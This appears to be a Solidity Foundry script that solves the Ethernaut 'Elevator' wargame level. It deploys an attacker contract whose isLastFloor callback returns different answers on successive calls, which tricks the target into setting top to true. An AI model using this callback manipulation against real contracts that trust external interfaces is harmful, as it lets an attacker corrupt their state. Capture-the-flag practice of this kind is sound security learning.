// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level11.sol";
import "forge-std/Script.sol";

contract ExploitLevel11 is Script {
    Elevator instance = Elevator(0x2DfA43D2504786BD3DB86c9dFBDcbC12Fb802D4F);
    AttackElevator attackInstance;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attackInstance = new AttackElevator(instance);
        attackInstance.attack();
        console.log("top:", instance.top());
        vm.stopBroadcast();
    }
}

contract AttackElevator {
    bool alreadyCalled;
    Elevator instance;

    constructor(Elevator _instance) {
        instance = _instance;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!alreadyCalled) {
            alreadyCalled = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        instance.goTo(100);
    }
}
